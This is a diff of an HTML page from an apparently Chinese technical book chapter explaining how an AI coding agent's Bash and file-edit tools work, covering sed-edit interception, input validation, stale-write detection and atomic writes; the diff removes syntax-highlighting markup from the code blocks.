 <p>解析失败时返回 <code>() =&gt; true</code> 确保安全 hook 不会被跳过——这是 fail-safe 设计。对于复合命令 <code>ls &amp;&amp; git push</code>，每个子命令都会被检查，确保 <code>Bash(git *)</code> 的安全 hook 能匹配到。</p>
 <h3 id="776-sed-拦截机制">7.7.6 sed 拦截机制</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">call</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-title class_">BashToolInput</span>, toolUseContext, ...</span>) {
-  <span class="hljs-keyword">if</span> (input.<span class="hljs-property">_simulatedSedEdit</span>) {
-    <span class="hljs-keyword">return</span> <span class="hljs-title function_">applySedEdit</span>(input.<span class="hljs-property">_simulatedSedEdit</span>, toolUseContext, parentMessage)
+<pre><code class="lang-typescript">async call(input: BashToolInput, toolUseContext, ...) {
+  if (input._simulatedSedEdit) {
+    return applySedEdit(input._simulatedSedEdit, toolUseContext, parentMessage)
   }
-  <span class="hljs-comment">// ... 正常命令执行</span>
+  // ... 正常命令执行
 }
 </code></pre>
 <p>当模型执行 sed 编辑命令时，权限对话框会解析 sed 命令并生成预览。用户批准后，预览结果通过 <code>_simulatedSedEdit</code> 字段传入，<code>applySedEdit</code> 直接写入文件，而不是真正执行 sed。这确保所见即所得。</p>
 <p><code>applySedEdit</code> 的实现：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">applySedEdit</span>(<span class="hljs-params">simulatedEdit, toolUseContext, parentMessage</span>) {
-  <span class="hljs-keyword">const</span> { filePath, newContent } = simulatedEdit
-  <span class="hljs-keyword">const</span> absoluteFilePath = <span class="hljs-title function_">expandPath</span>(filePath)
+<pre><code class="lang-typescript">async function applySedEdit(simulatedEdit, toolUseContext, parentMessage) {
+  const { filePath, newContent } = simulatedEdit
+  const absoluteFilePath = expandPath(filePath)
 
-  <span class="hljs-comment">// 1. 读取原始内容</span>
-  <span class="hljs-keyword">const</span> encoding = <span class="hljs-title function_">detectFileEncoding</span>(absoluteFilePath)
-  <span class="hljs-keyword">let</span> originalContent = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(absoluteFilePath, { encoding })
+  // 1. 读取原始内容
+  const encoding = detectFileEncoding(absoluteFilePath)
+  let originalContent = await fs.readFile(absoluteFilePath, { encoding })
 
-  <span class="hljs-comment">// 2. 跟踪文件历史（undo 支持）</span>
-  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">fileHistoryEnabled</span>() &amp;&amp; parentMessage) {
-    <span class="hljs-keyword">await</span> <span class="hljs-title function_">fileHistoryTrackEdit</span>(...)
+  // 2. 跟踪文件历史（undo 支持）
+  if (fileHistoryEnabled() &amp;&amp; parentMessage) {
+    await fileHistoryTrackEdit(...)
   }
 
-  <span class="hljs-comment">// 3. 检测行尾并写入新内容</span>
-  <span class="hljs-keyword">const</span> endings = <span class="hljs-title function_">detectLineEndings</span>(absoluteFilePath)
-  <span class="hljs-title function_">writeTextContent</span>(absoluteFilePath, newContent, encoding, endings)
+  // 3. 检测行尾并写入新内容
+  const endings = detectLineEndings(absoluteFilePath)
+  writeTextContent(absoluteFilePath, newContent, encoding, endings)
 
-  <span class="hljs-comment">// 4. 通知 VSCode</span>
-  <span class="hljs-title function_">notifyVscodeFileUpdated</span>(absoluteFilePath, originalContent, newContent)
+  // 4. 通知 VSCode
+  notifyVscodeFileUpdated(absoluteFilePath, originalContent, newContent)
 
-  <span class="hljs-comment">// 5. 更新读取时间戳（使过时写入检测正确工作）</span>
-  toolUseContext.<span class="hljs-property">readFileState</span>.<span class="hljs-title function_">set</span>(absoluteFilePath, {
-    <span class="hljs-attr">content</span>: newContent,
-    <span class="hljs-attr">timestamp</span>: <span class="hljs-title function_">getFileModificationTime</span>(absoluteFilePath),
-    <span class="hljs-attr">offset</span>: <span class="hljs-literal">undefined</span>,
-    <span class="hljs-attr">limit</span>: <span class="hljs-literal">undefined</span>
+  // 5. 更新读取时间戳（使过时写入检测正确工作）
+  toolUseContext.readFileState.set(absoluteFilePath, {
+    content: newContent,
+    timestamp: getFileModificationTime(absoluteFilePath),
+    offset: undefined,
+    limit: undefined
   })
 
-  <span class="hljs-keyword">return</span> { <span class="hljs-attr">data</span>: { <span class="hljs-attr">stdout</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">stderr</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">interrupted</span>: <span class="hljs-literal">false</span> } }
+  return { data: { stdout: '', stderr: '', interrupted: false } }
 }
 </code></pre>
 <h3 id="777-命令执行流程">7.7.7 命令执行流程</h3>
 <p>核心执行在 <code>runShellCommand</code> 异步生成器中：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title function_">runShellCommand</span>({ input, abortController, setAppState, ... }):
-  <span class="hljs-title class_">AsyncGenerator</span>&lt;{ <span class="hljs-attr">type</span>: <span class="hljs-string">'progress'</span>; ... }, <span class="hljs-title class_">ExecResult</span>, <span class="hljs-built_in">void</span>&gt; {
+<pre><code class="lang-typescript">async function* runShellCommand({ input, abortController, setAppState, ... }):
+  AsyncGenerator&lt;{ type: 'progress'; ... }, ExecResult, void&gt; {
 
-  <span class="hljs-keyword">const</span> { command, description, timeout, run_in_background } = input
-  <span class="hljs-keyword">const</span> timeoutMs = timeout || <span class="hljs-title function_">getDefaultTimeoutMs</span>()
+  const { command, description, timeout, run_in_background } = input
+  const timeoutMs = timeout || getDefaultTimeoutMs()
 
-  <span class="hljs-comment">// 1. 明确后台执行</span>
-  <span class="hljs-keyword">if</span> (run_in_background === <span class="hljs-literal">true</span> &amp;&amp; !isBackgroundTasksDisabled) {
-    <span class="hljs-keyword">const</span> shellId = <span class="hljs-keyword">await</span> <span class="hljs-title function_">spawnBackgroundTask</span>()
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">stdout</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">stderr</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">interrupted</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">backgroundTaskId</span>: shellId }
+  // 1. 明确后台执行
+  if (run_in_background === true &amp;&amp; !isBackgroundTasksDisabled) {
+    const shellId = await spawnBackgroundTask()
+    return { stdout: '', stderr: '', code: 0, interrupted: false, backgroundTaskId: shellId }
   }
 
-  <span class="hljs-comment">// 2. 启动命令（可能使用沙箱）</span>
-  <span class="hljs-keyword">const</span> shellCommand = <span class="hljs-keyword">await</span> <span class="hljs-title function_">exec</span>(command, abortController.<span class="hljs-property">signal</span>, <span class="hljs-string">'bash'</span>, {
-    <span class="hljs-attr">timeout</span>: timeoutMs,
-    <span class="hljs-title function_">onProgress</span>(<span class="hljs-params">lastLines, allLines, totalLines, totalBytes, isIncomplete</span>) { ... },
+  // 2. 启动命令（可能使用沙箱）
+  const shellCommand = await exec(command, abortController.signal, 'bash', {
+    timeout: timeoutMs,
+    onProgress(lastLines, allLines, totalLines, totalBytes, isIncomplete) { ... },
     preventCwdChanges,
-    <span class="hljs-attr">shouldUseSandbox</span>: <span class="hljs-title function_">shouldUseSandbox</span>(input),
+    shouldUseSandbox: shouldUseSandbox(input),
     shouldAutoBackground
   })
 
-  <span class="hljs-comment">// 3. 进度循环</span>
-  <span class="hljs-keyword">do</span> {
-    generatorResult = <span class="hljs-keyword">await</span> commandGenerator.<span class="hljs-title function_">next</span>()
-    <span class="hljs-keyword">if</span> (!generatorResult.<span class="hljs-property">done</span> &amp;&amp; onProgress) {
-      <span class="hljs-title function_">onProgress</span>({ <span class="hljs-attr">toolUseID</span>: <span class="hljs-string">`bash-progress-<span class="hljs-subst">${progressCounter++}</span>`</span>, <span class="hljs-attr">data</span>: { ... } })
+  // 3. 进度循环
+  do {
+    generatorResult = await commandGenerator.next()
+    if (!generatorResult.done &amp;&amp; onProgress) {
+      onProgress({ toolUseID: `bash-progress-${progressCounter++}`, data: { ... } })
     }
-  } <span class="hljs-keyword">while</span> (!generatorResult.<span class="hljs-property">done</span>)
+  } while (!generatorResult.done)
 
-  <span class="hljs-comment">// 4. 结果处理</span>
-  result = generatorResult.<span class="hljs-property">value</span>
-  <span class="hljs-title function_">trackGitOperations</span>(input.<span class="hljs-property">command</span>, result.<span class="hljs-property">code</span>, result.<span class="hljs-property">stdout</span>)
+  // 4. 结果处理
+  result = generatorResult.value
+  trackGitOperations(input.command, result.code, result.stdout)
 }
 </code></pre>
 <p><code>call()</code> 方法中的后处理包括：</p>
 <ul>
 <li>沙箱违规标注：<code>SandboxManager.annotateStderrWithSandboxFailures</code></li>
 <li>空行剥离：<code>stripEmptyLines</code></li>
-<li>Claude Code hints 提取：<code>extractClaudeCodeHints</code>（从 stderr 提取 <code>&lt;claude-code-hint /&gt;</code> 标签后剥离）</li>
+<li>Claude Code hints 提取：<code>extractClaudeCodeHints</code>（从 stderr 提取 <code><claude-code-hint></claude-code-hint></code> 标签后剥离）</li>
 <li>图片输出压缩：<code>resizeShellImageOutput</code></li>
 <li>大输出持久化：超过 <code>maxResultSizeChars</code> 的输出保存到磁盘</li>
 </ul>
@@ -1206,277 +1047,277 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 </ol>
 <h3 id="782-输入校验-validateinput">7.8.2 输入校验 (validateInput)</h3>
 <p><code>validateInput</code> 是 FileEditTool 中最长的方法，执行了多层校验：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">validateInput</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-title class_">FileEditInput</span>, <span class="hljs-attr">toolUseContext</span>: <span class="hljs-title class_">ToolUseContext</span></span>) {
-  <span class="hljs-keyword">const</span> { file_path, old_string, new_string, replace_all = <span class="hljs-literal">false</span> } = input
-  <span class="hljs-keyword">const</span> fullFilePath = <span class="hljs-title function_">expandPath</span>(file_path)
+<pre><code class="lang-typescript">async validateInput(input: FileEditInput, toolUseContext: ToolUseContext) {
+  const { file_path, old_string, new_string, replace_all = false } = input
+  const fullFilePath = expandPath(file_path)
 
-  <span class="hljs-comment">// 1. 秘密检查：拒绝向团队记忆文件写入密钥</span>
-  <span class="hljs-keyword">const</span> secretError = <span class="hljs-title function_">checkTeamMemSecrets</span>(fullFilePath, new_string)
-  <span class="hljs-keyword">if</span> (secretError) <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: secretError, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">0</span> }
+  // 1. 秘密检查：拒绝向团队记忆文件写入密钥
+  const secretError = checkTeamMemSecrets(fullFilePath, new_string)
+  if (secretError) return { result: false, message: secretError, errorCode: 0 }
 
-  <span class="hljs-comment">// 2. 无变更检查</span>
-  <span class="hljs-keyword">if</span> (old_string === new_string) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'No changes to make...'</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">1</span> }
+  // 2. 无变更检查
+  if (old_string === new_string) {
+    return { result: false, message: 'No changes to make...', errorCode: 1 }
   }
 
-  <span class="hljs-comment">// 3. deny 规则检查</span>
-  <span class="hljs-keyword">const</span> denyRule = <span class="hljs-title function_">matchingRuleForInput</span>(fullFilePath, ..., <span class="hljs-string">'edit'</span>, <span class="hljs-string">'deny'</span>)
-  <span class="hljs-keyword">if</span> (denyRule !== <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, ..., <span class="hljs-attr">errorCode</span>: <span class="hljs-number">2</span> }
+  // 3. deny 规则检查
+  const denyRule = matchingRuleForInput(fullFilePath, ..., 'edit', 'deny')
+  if (denyRule !== null) return { result: false, ..., errorCode: 2 }
 
-  <span class="hljs-comment">// 4. UNC 路径安全检查（防止 NTLM 凭证泄露）</span>
-  <span class="hljs-keyword">if</span> (fullFilePath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'\\\\'</span>) || fullFilePath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'//'</span>)) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">true</span> }
+  // 4. UNC 路径安全检查（防止 NTLM 凭证泄露）
+  if (fullFilePath.startsWith('\\\\') || fullFilePath.startsWith('//')) {
+    return { result: true }
   }
 
-  <span class="hljs-comment">// 5. 文件大小检查（最大 1 GiB）</span>
-  <span class="hljs-keyword">const</span> { size } = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">stat</span>(fullFilePath)
-  <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-variable constant_">MAX_EDIT_FILE_SIZE</span>) <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, ..., <span class="hljs-attr">errorCode</span>: <span class="hljs-number">10</span> }
+  // 5. 文件大小检查（最大 1 GiB）
+  const { size } = await fs.stat(fullFilePath)
+  if (size &gt; MAX_EDIT_FILE_SIZE) return { result: false, ..., errorCode: 10 }
 
-  <span class="hljs-comment">// 6. 读取文件内容（检测 UTF-16LE 编码）</span>
-  <span class="hljs-keyword">const</span> fileBuffer = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFileBytes</span>(fullFilePath)
-  <span class="hljs-keyword">const</span> encoding = fileBuffer[<span class="hljs-number">0</span>] === <span class="hljs-number">0xff</span> &amp;&amp; fileBuffer[<span class="hljs-number">1</span>] === <span class="hljs-number">0xfe</span> ? <span class="hljs-string">'utf16le'</span> : <span class="hljs-string">'utf8'</span>
-  fileContent = fileBuffer.<span class="hljs-title function_">toString</span>(encoding).<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">'\r\n'</span>, <span class="hljs-string">'\n'</span>)
+  // 6. 读取文件内容（检测 UTF-16LE 编码）
+  const fileBuffer = await fs.readFileBytes(fullFilePath)
+  const encoding = fileBuffer[0] === 0xff &amp;&amp; fileBuffer[1] === 0xfe ? 'utf16le' : 'utf8'
+  fileContent = fileBuffer.toString(encoding).replaceAll('\r\n', '\n')
 
-  <span class="hljs-comment">// 7. 文件不存在时的处理</span>
-  <span class="hljs-keyword">if</span> (fileContent === <span class="hljs-literal">null</span>) {
-    <span class="hljs-keyword">if</span> (old_string === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">true</span> }  <span class="hljs-comment">// 新文件创建</span>
-    <span class="hljs-keyword">const</span> similarFilename = <span class="hljs-title function_">findSimilarFile</span>(fullFilePath)
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, ..., <span class="hljs-attr">errorCode</span>: <span class="hljs-number">4</span> }
+  // 7. 文件不存在时的处理
+  if (fileContent === null) {
+    if (old_string === '') return { result: true }  // 新文件创建
+    const similarFilename = findSimilarFile(fullFilePath)
+    return { result: false, ..., errorCode: 4 }
   }
 
-  <span class="hljs-comment">// 8. 文件存在但 old_string 为空 -- 只有空文件才合法</span>
-  <span class="hljs-keyword">if</span> (old_string === <span class="hljs-string">''</span> &amp;&amp; fileContent.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">''</span>) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'Cannot create new file - file already exists.'</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">3</span> }
+  // 8. 文件存在但 old_string 为空 -- 只有空文件才合法
+  if (old_string === '' &amp;&amp; fileContent.trim() !== '') {
+    return { result: false, message: 'Cannot create new file - file already exists.', errorCode: 3 }
   }
 
-  <span class="hljs-comment">// 9. Jupyter Notebook 重定向</span>
-  <span class="hljs-keyword">if</span> (fullFilePath.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.ipynb'</span>)) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">`Use the <span class="hljs-subst">${NOTEBOOK_EDIT_TOOL_NAME}</span>...`</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">5</span> }
+  // 9. Jupyter Notebook 重定向
+  if (fullFilePath.endsWith('.ipynb')) {
+    return { result: false, message: `Use the ${NOTEBOOK_EDIT_TOOL_NAME}...`, errorCode: 5 }
   }
 
-  <span class="hljs-comment">// 10. 必须先读取文件</span>
-  <span class="hljs-keyword">const</span> readTimestamp = toolUseContext.<span class="hljs-property">readFileState</span>.<span class="hljs-title function_">get</span>(fullFilePath)
-  <span class="hljs-keyword">if</span> (!readTimestamp || readTimestamp.<span class="hljs-property">isPartialView</span>) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'File has not been read yet...'</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">6</span> }
+  // 10. 必须先读取文件
+  const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
+  if (!readTimestamp || readTimestamp.isPartialView) {
+    return { result: false, message: 'File has not been read yet...', errorCode: 6 }
   }
 
-  <span class="hljs-comment">// 11. 过时写入检测</span>
-  <span class="hljs-keyword">if</span> (readTimestamp) {
-    <span class="hljs-keyword">const</span> lastWriteTime = <span class="hljs-title function_">getFileModificationTime</span>(fullFilePath)
-    <span class="hljs-keyword">if</span> (lastWriteTime &gt; readTimestamp.<span class="hljs-property">timestamp</span>) {
-      <span class="hljs-keyword">const</span> isFullRead = readTimestamp.<span class="hljs-property">offset</span> === <span class="hljs-literal">undefined</span> &amp;&amp; readTimestamp.<span class="hljs-property">limit</span> === <span class="hljs-literal">undefined</span>
-      <span class="hljs-keyword">if</span> (isFullRead &amp;&amp; fileContent === readTimestamp.<span class="hljs-property">content</span>) {
-        <span class="hljs-comment">// 内容没变（Windows 上时间戳可能因云同步/杀毒软件改变），安全继续</span>
-      } <span class="hljs-keyword">else</span> {
-        <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'File has been modified since read...'</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">7</span> }
+  // 11. 过时写入检测
+  if (readTimestamp) {
+    const lastWriteTime = getFileModificationTime(fullFilePath)
+    if (lastWriteTime &gt; readTimestamp.timestamp) {
+      const isFullRead = readTimestamp.offset === undefined &amp;&amp; readTimestamp.limit === undefined
+      if (isFullRead &amp;&amp; fileContent === readTimestamp.content) {
+        // 内容没变（Windows 上时间戳可能因云同步/杀毒软件改变），安全继续
+      } else {
+        return { result: false, message: 'File has been modified since read...', errorCode: 7 }
       }
     }
   }
 
-  <span class="hljs-comment">// 12. 字符串查找（带引号规范化）</span>
-  <span class="hljs-keyword">const</span> actualOldString = <span class="hljs-title function_">findActualString</span>(file, old_string)
-  <span class="hljs-keyword">if</span> (!actualOldString) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">`String to replace not found...`</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">8</span> }
+  // 12. 字符串查找（带引号规范化）
+  const actualOldString = findActualString(file, old_string)
+  if (!actualOldString) {
+    return { result: false, message: `String to replace not found...`, errorCode: 8 }
   }
 
-  <span class="hljs-comment">// 13. 多匹配检查</span>
-  <span class="hljs-keyword">const</span> matches = file.<span class="hljs-title function_">split</span>(actualOldString).<span class="hljs-property">length</span> - <span class="hljs-number">1</span>
-  <span class="hljs-keyword">if</span> (matches &gt; <span class="hljs-number">1</span> &amp;&amp; !replace_all) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">`Found <span class="hljs-subst">${matches}</span> matches...`</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">9</span> }
+  // 13. 多匹配检查
+  const matches = file.split(actualOldString).length - 1
+  if (matches &gt; 1 &amp;&amp; !replace_all) {
+    return { result: false, message: `Found ${matches} matches...`, errorCode: 9 }
   }
 
-  <span class="hljs-comment">// 14. Claude 设置文件的额外校验</span>
-  <span class="hljs-keyword">const</span> settingsValidationResult = <span class="hljs-title function_">validateInputForSettingsFileEdit</span>(...)
-  <span class="hljs-keyword">if</span> (settingsValidationResult !== <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> settingsValidationResult
+  // 14. Claude 设置文件的额外校验
+  const settingsValidationResult = validateInputForSettingsFileEdit(...)
+  if (settingsValidationResult !== null) return settingsValidationResult
 
-  <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">meta</span>: { actualOldString } }
+  return { result: true, meta: { actualOldString } }
 }
 </code></pre>
 <h3 id="783-过时写入检测的双重检查">7.8.3 过时写入检测的双重检查</h3>
 <p>第 11 步是 FileEditTool 的核心安全机制。它检查文件在上次读取后是否被修改：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> lastWriteTime = <span class="hljs-title function_">getFileModificationTime</span>(fullFilePath)
-<span class="hljs-keyword">if</span> (lastWriteTime &gt; readTimestamp.<span class="hljs-property">timestamp</span>) {
-  <span class="hljs-comment">// 时间戳变了，但在 Windows 上可能是误报</span>
-  <span class="hljs-keyword">const</span> isFullRead = readTimestamp.<span class="hljs-property">offset</span> === <span class="hljs-literal">undefined</span> &amp;&amp; readTimestamp.<span class="hljs-property">limit</span> === <span class="hljs-literal">undefined</span>
-  <span class="hljs-keyword">if</span> (isFullRead &amp;&amp; fileContent === readTimestamp.<span class="hljs-property">content</span>) {
-    <span class="hljs-comment">// 内容实际没变，安全继续</span>
-  } <span class="hljs-keyword">else</span> {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">result</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'File has been modified since read...'</span>, <span class="hljs-attr">errorCode</span>: <span class="hljs-number">7</span> }
+<pre><code class="lang-typescript">const lastWriteTime = getFileModificationTime(fullFilePath)
+if (lastWriteTime &gt; readTimestamp.timestamp) {
+  // 时间戳变了，但在 Windows 上可能是误报
+  const isFullRead = readTimestamp.offset === undefined &amp;&amp; readTimestamp.limit === undefined
+  if (isFullRead &amp;&amp; fileContent === readTimestamp.content) {
+    // 内容实际没变，安全继续
+  } else {
+    return { result: false, message: 'File has been modified since read...', errorCode: 7 }
   }
 }
 </code></pre>
 <p>这里有一个 Windows 特殊处理：云同步、杀毒软件等可能在不修改内容的情况下改变时间戳。如果是完整读取且内容不变，则忽略时间戳差异。</p>
 <h3 id="784-引号保留机制">7.8.4 引号保留机制</h3>
 <p><code>findActualString</code> 和 <code>preserveQuoteStyle</code> 处理 curly quotes vs straight quotes 的问题。模型可能输出 straight quotes，但文件中使用 curly quotes（或反之）：</p>
-<pre><code class="lang-typescript"><span class="hljs-comment">// call() 方法中：</span>
-<span class="hljs-keyword">const</span> actualOldString = <span class="hljs-title function_">findActualString</span>(originalFileContents, old_string) || old_string
-<span class="hljs-keyword">const</span> actualNewString = <span class="hljs-title function_">preserveQuoteStyle</span>(old_string, actualOldString, new_string)
+<pre><code class="lang-typescript">// call() 方法中：
+const actualOldString = findActualString(originalFileContents, old_string) || old_string
+const actualNewString = preserveQuoteStyle(old_string, actualOldString, new_string)
 </code></pre>
 <p>如果 <code>findActualString</code> 发现文件中的实际字符串与模型输入不同（仅引号样式不同），它返回文件中的实际版本。然后 <code>preserveQuoteStyle</code> 确保 <code>new_string</code> 中的引号样式与文件中的一致。</p>
 <h3 id="785-原子性写入">7.8.5 原子性写入</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">call</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-title class_">FileEditInput</span>, { readFileState, ... }</span>) {
-  <span class="hljs-comment">// 异步预处理（可以有 await）</span>
-  <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">mkdir</span>(<span class="hljs-title function_">dirname</span>(absoluteFilePath))
-  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fileHistoryTrackEdit</span>(...)
+<pre><code class="lang-typescript">async call(input: FileEditInput, { readFileState, ... }) {
+  // 异步预处理（可以有 await）
+  await fs.mkdir(dirname(absoluteFilePath))
+  await fileHistoryTrackEdit(...)
 
-  <span class="hljs-comment">// === 临界区开始：避免在这里和写入之间做异步操作 ===</span>
-  <span class="hljs-keyword">const</span> { <span class="hljs-attr">content</span>: originalFileContents, fileExists, encoding, lineEndings } =
-    <span class="hljs-title function_">readFileForEdit</span>(absoluteFilePath)
+  // === 临界区开始：避免在这里和写入之间做异步操作 ===
+  const { content: originalFileContents, fileExists, encoding, lineEndings } =
+    readFileForEdit(absoluteFilePath)
 
-  <span class="hljs-comment">// 再次检查过时写入（双重检查锁定模式）</span>
-  <span class="hljs-keyword">if</span> (fileExists) {
-    <span class="hljs-keyword">const</span> lastWriteTime = <span class="hljs-title function_">getFileModificationTime</span>(absoluteFilePath)
-    <span class="hljs-keyword">const</span> lastRead = readFileState.<span class="hljs-title function_">get</span>(absoluteFilePath)
-    <span class="hljs-keyword">if</span> (!lastRead || lastWriteTime &gt; lastRead.<span class="hljs-property">timestamp</span>) {
-      <span class="hljs-comment">// ...同样的内容比较逻辑</span>
-      <span class="hljs-keyword">if</span> (!contentUnchanged) {
-        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">FILE_UNEXPECTEDLY_MODIFIED_ERROR</span>)
+  // 再次检查过时写入（双重检查锁定模式）
+  if (fileExists) {
+    const lastWriteTime = getFileModificationTime(absoluteFilePath)
+    const lastRead = readFileState.get(absoluteFilePath)
+    if (!lastRead || lastWriteTime &gt; lastRead.timestamp) {
+      // ...同样的内容比较逻辑
+      if (!contentUnchanged) {
+        throw new Error(FILE_UNEXPECTEDLY_MODIFIED_ERROR)
       }
     }
   }
 
-  <span class="hljs-comment">// 执行替换</span>
-  <span class="hljs-keyword">const</span> { patch, updatedFile } = <span class="hljs-title function_">getPatchForEdit</span>({ ... })
+  // 执行替换
+  const { patch, updatedFile } = getPatchForEdit({ ... })
 
-  <span class="hljs-comment">// 写入磁盘</span>
-  <span class="hljs-title function_">writeTextContent</span>(absoluteFilePath, updatedFile, encoding, endings)
-  <span class="hljs-comment">// === 临界区结束 ===</span>
+  // 写入磁盘
+  writeTextContent(absoluteFilePath, updatedFile, encoding, endings)
+  // === 临界区结束 ===
 
-  <span class="hljs-comment">// 后续处理（可以异步）</span>
-  readFileState.<span class="hljs-title function_">set</span>(absoluteFilePath, { <span class="hljs-attr">content</span>: updatedFile, <span class="hljs-attr">timestamp</span>: ... })
+  // 后续处理（可以异步）
+  readFileState.set(absoluteFilePath, { content: updatedFile, timestamp: ... })
 }
 </code></pre>
 <p>注释 <code>Please avoid async operations between here and writing to disk to preserve atomicity</code> 明确标记了临界区。<code>readFileForEdit</code> 使用同步的 <code>readFileSyncWithMetadata</code> 而非异步读取，进一步确保原子性。</p>
 <h3 id="786-执行后的状态更新">7.8.6 执行后的状态更新</h3>
 <p>写入成功后，FileEditTool 执行一系列状态更新：</p>
-<pre><code class="lang-typescript"><span class="hljs-comment">// 1. 更新文件读取状态（使下一次编辑的过时检测正确工作）</span>
-readFileState.<span class="hljs-title function_">set</span>(absoluteFilePath, {
-  <span class="hljs-attr">content</span>: updatedFile,
-  <span class="hljs-attr">timestamp</span>: <span class="hljs-title function_">getFileModificationTime</span>(absoluteFilePath),
-  <span class="hljs-attr">offset</span>: <span class="hljs-literal">undefined</span>,
-  <span class="hljs-attr">limit</span>: <span class="hljs-literal">undefined</span>,
+<pre><code class="lang-typescript">// 1. 更新文件读取状态（使下一次编辑的过时检测正确工作）
+readFileState.set(absoluteFilePath, {
+  content: updatedFile,
+  timestamp: getFileModificationTime(absoluteFilePath),
+  offset: undefined,
+  limit: undefined,
 })
 
-<span class="hljs-comment">// 2. 通知 LSP 服务器</span>
-lspManager.<span class="hljs-title function_">changeFile</span>(absoluteFilePath, updatedFile)
-lspManager.<span class="hljs-title function_">saveFile</span>(absoluteFilePath)
+// 2. 通知 LSP 服务器
+lspManager.changeFile(absoluteFilePath, updatedFile)
+lspManager.saveFile(absoluteFilePath)
 
-<span class="hljs-comment">// 3. 通知 VSCode（diff 视图）</span>
-<span class="hljs-title function_">notifyVscodeFileUpdated</span>(absoluteFilePath, originalFileContents, updatedFile)
+// 3. 通知 VSCode（diff 视图）
+notifyVscodeFileUpdated(absoluteFilePath, originalFileContents, updatedFile)
 
-<span class="hljs-comment">// 4. 分析事件</span>
-<span class="hljs-title function_">logEvent</span>(<span class="hljs-string">'tengu_edit_string_lengths'</span>, { ... })
-<span class="hljs-title function_">logFileOperation</span>({ <span class="hljs-attr">operation</span>: <span class="hljs-string">'edit'</span>, <span class="hljs-attr">tool</span>: <span class="hljs-string">'FileEditTool'</span>, filePath })
+// 4. 分析事件
+logEvent('tengu_edit_string_lengths', { ... })
+logFileOperation({ operation: 'edit', tool: 'FileEditTool', filePath })
 </code></pre>
 <h2 id="79-filereadtool-核心设计">7.9 FileReadTool 核心设计</h2>
 <h3 id="791-安全防护">7.9.1 安全防护</h3>
 <p>FileReadTool 的第一道防线是设备路径阻断：</p>
